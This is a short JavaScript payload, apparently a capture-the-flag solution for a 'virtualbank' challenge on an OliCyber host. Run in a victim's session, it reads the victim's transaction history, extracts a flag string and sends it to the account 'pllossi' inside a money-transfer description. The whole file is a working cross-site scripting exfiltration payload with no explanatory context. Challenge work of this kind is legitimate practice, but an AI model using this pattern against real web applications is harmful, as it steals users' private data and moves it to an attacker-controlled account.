(async function () {
    var transactionResponse = await fetch("http://virtualbank.challs.olicyber.it/history/1");
    var tText = await transactionResponse.text();
    var flag = tText.match("flag{.+}")[0];
    var fd = new FormData();
    fd.append("to", "pllossi");
    fd.append("amount", "1");
    fd.append("description", flag);
    fetch(
        "http://virtualbank.challs.olicyber.it/sendmoney",
        {
            method: "POST",
            body: fd,
        },
    );
})();